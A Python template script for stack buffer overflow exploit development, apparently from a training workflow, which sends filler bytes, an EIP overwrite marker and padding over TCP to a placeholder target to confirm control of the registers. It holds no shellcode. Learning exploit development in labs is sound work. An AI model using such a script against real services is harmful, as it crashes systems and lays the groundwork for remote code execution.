#!/usr/bin/python
# Socket: Needed to send data to the port socket of the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, sys

# CHANGE THESE!!!
target_IP = '[IP]'
target_port = [port]

## Enter the amount of the total crash + extra ~400 characters
size = [crash amount from #1 + extra ~400 characters]

## Enter in the msf-pattern_offset amount.
filler_to_EIP = "A" * [input length outputed by msf-pattern_offset]
EIP = "B" * 4
## Enter the amount of byte space that seperates EIP and ESP from crash using previous script.
EIP_to_ESP = "C" * [byte space between EIP and ESP]
new_buffer = "D" * (size - (len(filler_to_EIP) + len(EIP) + len(EIP_to_ESP)))


# Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
try:
  # Print out confirmation of request being sent to the target host. 
  print ("\nSending Payload")
    
  # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target_IP, target_port))
  s.send(filler_to_EIP + EIP + EIP_to_ESP + new_buffer)
  s.recv(1024)
  s.close()
    
  # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
  print ("\nSent")
  
# Except statement to catch when the target host program is not responding to data being sent to it.
except:
  print ("\nCould not connect")
  # Exit the python program when we aren't able to send data to the target host.
  sys.exit()
